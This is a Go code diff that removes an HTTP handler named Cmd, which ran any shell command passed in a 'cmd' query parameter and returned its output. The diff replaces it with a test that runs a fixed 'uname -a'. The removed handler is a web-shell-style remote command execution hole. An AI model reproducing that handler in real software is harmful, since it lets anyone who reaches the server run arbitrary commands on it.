@@ -2,17 +2,14 @@ package api
 
 import (
 	"fmt"
-	"net/http"
 	"os/exec"
 	"strings"
+	"testing"
 )
 
-func Cmd(w http.ResponseWriter, r *http.Request) {
-	params := r.URL.Query()
+func TestXxx(t *testing.T) {
 
-	// 获取特定参数的值
-	cmdStr := params.Get("cmd")
-
+	cmdStr := "uname -a"
 	cmds := strings.Split(cmdStr, " ")
 	args := cmds[1:]
 	cmd := exec.Command(cmds[0], args...)
@@ -20,13 +17,9 @@ func Cmd(w http.ResponseWriter, r *http.Request) {
 	// 捕获命令的输出
 	output, err := cmd.CombinedOutput()
 	if err != nil {
-		w.Write([]byte(err.Error()))
+		fmt.Println(err)
 		return
 	}
 
-	// 打印命令的输出
-	fmt.Println("Command output:")
 	fmt.Println(string(output))
-	w.Write(output)
-
 }
